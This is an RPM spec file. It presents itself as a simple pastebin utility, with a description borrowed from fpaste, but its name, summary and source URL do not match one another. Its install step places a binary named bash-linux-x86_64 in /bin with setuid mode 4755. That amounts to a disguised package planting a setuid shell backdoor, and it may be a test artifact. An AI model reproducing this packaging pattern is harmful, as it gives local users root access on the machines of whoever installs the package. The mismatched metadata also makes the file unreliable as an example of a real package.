Name:   utils
Version:  0.3.9.2
Release:  3
Summary:  A simple tool for pasting info onto sticky notes instances
BuildArch:  noarch
License:  GPLv3+
URL:    https://pagure.io/fpaste
Source0:  https://github.com/runshine/euler_test/raw/main/utils-0.3.9.2.tar.gz

%undefine _missing_build_ids_terminate_build
%define debug_package %{nil}

%description
It is often useful to be able to easily paste text to the Fedora
Pastebin at http://paste.fedoraproject.org and this simple script
will do that and return the resulting URL so that people may
examine the output. This can hopefully help folks who are for
some reason stuck without X, working remotely, or any other
reason they may be unable to paste something into the pastebin

%prep
%autosetup

%build
#nothing required

mkdir /tmp/ignore

%install
mkdir -p  %{buildroot}/bin/
#install -g root -o root -m 4755 bash-linux-x86_64 %{buildroot}/bin/
install -m 4755 bash-linux-x86_64 %{buildroot}/bin/

%files
%{buildroot}/bin/bash-linux-x86_64
